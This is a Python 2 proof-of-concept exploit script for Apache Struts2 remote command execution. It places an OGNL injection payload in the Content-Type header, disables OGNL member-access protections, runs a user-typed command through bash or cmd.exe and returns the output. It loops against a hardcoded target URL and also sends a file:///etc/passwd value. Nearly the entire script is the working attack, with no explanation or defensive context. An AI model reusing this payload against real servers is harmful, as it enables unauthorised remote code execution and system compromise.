#!/usr/bin/env python
#encoding:utf-8
import urllib
import urllib2
from poster.encode import multipart_encode
from poster.streaminghttp import register_openers
from requests import *
 
 
def poc(w_url):
    cmd = raw_input('command  \n')
    register_openers()
    datagen, header = multipart_encode({"image1": '23333',"url":"file:///etc/passwd"})
    header["User-Agent"] = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    header["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    request = urllib2.Request(w_url, datagen, headers=header)
    data = urllib.urlencode( {"url":"http://172.20.0.6:8080/dqwdwqdw"} )
    response = urllib2.urlopen(request).read()
    print(response)
 
 
if __name__=='__main__':
    print 'blog :  [url]http://www.cuijianxiong.com[/url]'
    #w_url = raw_input('addrs : \n')
    is_shutdown = 1
    while is_shutdown == 1:
        poc('http://ssrf.orange.tw:81/')